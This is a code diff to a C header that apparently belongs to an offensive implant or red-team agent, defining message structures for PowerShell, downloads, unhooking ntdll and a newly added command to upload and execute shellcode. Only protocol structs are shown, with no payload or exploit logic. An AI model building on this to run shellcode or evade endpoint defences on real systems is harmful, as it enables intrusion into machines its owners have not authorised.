@@ -131,7 +131,7 @@ MSG_TEMPLATE_END(unhookl);
 /* -- UNHOOK_BYON: SEND AN NTDLL TO UNHOOK WITH -- */
 
 REQ_TEMPLATE_BEGIN(unhookbyon);
-	int64_t file_len;
+int64_t file_len;
 REQ_TEMPLATE_END(unhookbyon);
 
 ALLOWED_RES(unhookbyon);
@@ -152,6 +152,29 @@ union {
 };
 MSG_TEMPLATE_END(unhookbyon);
 
+/* -- RUNCODE: UPLOAD AND EXECUTE SHELLCODE -- */
+
+REQ_TEMPLATE_BEGIN(runcode);
+int64_t file_len;
+REQ_TEMPLATE_END(runcode);
+
+ALLOWED_RES(runcode);
+SIMPLE_FIN(runcode);
+SIMPLE_FAK(runcode);
+
+struct runcode_running_t {
+	uint8_t sanity;
+};
+
+MSG_TEMPLATE_BEGIN(runcode);
+union {
+	struct runcode_req_t req;
+	struct runcode_res_t res;
+	struct runcode_running_t running;
+	struct runcode_fin_t fin;
+	struct runcode_fak_t fak;
+};
+MSG_TEMPLATE_END(runcode);
 
 enum wrkr_msg_enum_t {
 	POWERSHELL,
@@ -172,8 +195,8 @@ struct wrkr_msg_t {
 		struct download_msg_t download;
 		struct unhookl_msg_t unhookl;
 		struct unhookbyon_msg_t unhookbyon;
+		struct runcode_msg_t runcode;
 		/*
-			struct runcode_msg_t runcode;
 			struct runbin_msg_t runbin;
 		*/
 	};
